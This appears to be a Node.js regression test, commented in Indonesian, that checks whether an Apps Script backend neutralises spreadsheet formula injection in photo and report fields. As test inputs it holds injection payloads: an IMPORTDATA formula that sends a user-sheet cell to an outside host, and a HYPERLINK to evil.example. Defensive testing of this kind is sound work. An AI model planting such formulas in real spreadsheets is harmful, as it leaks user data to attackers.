/* Regresi v16-sec: injeksi rumus/HYPERLINK lewat kind foto AC dan teks laporan ke sheet foto/arsip. */
const fs=require('fs'),vm=require('vm');
const src=fs.readFileSync(require('path').join(__dirname,'..','backend','Code.gs'),'utf8');
const ctx={console,Logger:{log(){}},PropertiesService:{getScriptProperties:()=>({getProperty:()=>'x'})},Utilities:{formatDate:()=>'07/11/2026 10:00'}};
vm.createContext(ctx);vm.runInContext(src,ctx);
const r=[];const ck=(n,c)=>r.push((c?'PASS ':'FAIL ')+n);
const p=(k)=>ctx.photoRow_({reportId:'R',kind:k,fileId:'F1',uploadedAt:1,photoId:'P'},1);
ck('kind rumus IMPORTDATA diberi awalan spasi',p('=IMPORTDATA("https://e/"&USERS!G2)')[2][0]===' ');
ck('kind +/-/@/apostrof/tab dinetralkan',['+1','-1','@x',"'=1",'\tx'].every(k=>p(k)[2][0]===' '));
ck('kind normal tidak berubah',p('TH1')[2]==='TH1'&&p('Lobby Utama')[2]==='Lobby Utama'&&p(undefined)[2]==='Foto');
ck('tautan foto server tetap =HYPERLINK drive',/^=HYPERLINK\("https:\/\/drive\.google\.com\/file\/d\/F1\/view","Buka foto"\)$/.test(p('A')[4]));
const row=ctx.rowSafe_(['=HYPERLINK("https://evil.example","Klik")','ok',5,null,'12/11']);
ck('rowSafe_ menetralkan HYPERLINK buatan pengguna, angka/null utuh',row[0][0]===' '&&row[1]==='ok'&&row[2]===5&&row[3]===null&&row[4]==='12/11');
// putRows_: simulasikan sheet
let wrote=null,links=[];
const sheet={getRange:()=>({setValues:v=>{wrote=v},setRichTextValues:v=>{links.push(v)}})};
ctx.SpreadsheetApp={newRichTextValue:()=>{let t='',u='';const b={setText:x=>{t=x;return b},setLinkUrl:x=>{u=x;return b},build:()=>({t,u})};return b}};
ctx.putRows_(sheet,2,1,[['x','=HYPERLINK("https://evil.example","Klik")','=HYPERLINK("https://drive.google.com/drive/folders/AB","Buka folder")']]);
ck('URL non-Drive tidak dijadikan tautan (tetap teks di sel)',wrote[0][1]==='=HYPERLINK("https://evil.example","Klik")'&&links.length===1);
ck('URL Drive buatan server tetap jadi tautan',wrote[0][2]===''&&links[0][0][0].u==='https://drive.google.com/drive/folders/AB');
r.forEach(x=>console.log(x));console.log('HASIL: '+r.filter(x=>x.startsWith('PASS')).length+'/'+r.length+' lulus');process.exit(r.some(x=>x.startsWith('FAIL'))?1:0);
